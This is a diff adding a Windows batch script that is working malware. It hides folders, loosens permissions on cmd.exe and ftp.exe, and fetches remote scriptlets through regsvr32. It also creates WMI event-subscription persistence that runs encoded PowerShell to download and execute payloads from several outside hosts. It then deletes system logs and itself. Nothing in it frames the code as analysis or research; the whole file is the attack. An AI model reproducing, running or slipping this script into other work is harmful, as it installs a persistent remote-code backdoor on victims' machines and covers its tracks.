@@ -1,0 +1,32 @@
+@echo off
+mode con: cols=13 lines=1
+md C:\Progra~1\shengda
+md C:\Progra~1\kugou2010
+md C:\download
+regsvr32 /s shell32.dll
+regsvr32 /s WSHom.Ocx
+regsvr32 /s scrrun.dll
+regsvr32 /s c:\Progra~1\Common~1\System\Ado\Msado15.dll
+regsvr32 /s jscript.dll
+regsvr32 /s vbscript.dll
+start regsvr32 /u /s /i:http://js.1226bye.pw:280/v.sct scrobj.dll
+attrib +s +h C:\Progra~1\shengda
+attrib +s +h C:\Progra~1\kugou2010
+attrib +s +h C:\download
+cacls cmd.exe /e /g system:f
+cacls cmd.exe /e /g everyone:f
+cacls ftp.exe /e /g system:f
+cacls ftp.exe /e /g everyone:f
+cacls c:\windows\help\akpls.exe /e /g system:f
+cacls c:\windows\help\akpls.exe /e /g everyone:f
+cacls C:\Progra~1\Common~1\System\ado\msado15.dll /e /g system:f
+cacls C:\Progra~1\Common~1\System\ado\msado15.dll /e /g everyone:f
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v shell /f
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="fuckyoumm3", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 10800 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"&wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="fuckyoumm4", CommandLineTemplate="cmd /c powershell.exe -nop -enc JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AdwBtAGkALgAxADIAMQA3AGIAeQBlAC4AaABvAHMAdAA6ADgAOAA4ADgALwAyAC4AdAB4AHQAIgApAC4AdAByAGkAbQAoACkAIAAtAHMAcABsAGkAdAAgACIAWwBcAHIAXABuAF0AKwAiAHwAJQB7ACQAbgA9ACQAXwAuAHMAcABsAGkAdAAoACIALwAiACkAWwAtADEAXQA7ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAF8ALAAgACQAbgApADsAcwB0AGEAcgB0ACAAJABuADsAfQA=&powershell.exe IEX (New-Object system.Net.WebClient).DownloadString('http://wmi.1217bye.host/S.ps1')&powershell.exe IEX (New-Object system.Net.WebClient).DownloadString('http://173.208.139.170/s.txt')&powershell.exe IEX (New-Object system.Net.WebClient).DownloadString('http://35.182.171.137/s.jpg')||regsvr32 /u /s /i:http://wmi.1217bye.host/1.txt scrobj.dll&regsvr32 /u /s /i:http://173.208.139.170/2.txt scrobj.dll&regsvr32 /u /s /i:http://35.182.171.137/3.txt scrobj.dll"&wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"fuckyoumm3\"", Consumer="CommandLineEventConsumer.Name=\"fuckyoumm4\""
+del c:\windows\system32\wbem\se.bat
+del c:\windows\system32\wbem\12345.bat
+del c:\windows\system32\wbem\123456.bat
+del c:\windows\system32\wbem\1234.bat
+del c:\windows\system32\*.log
+del %0
+exit
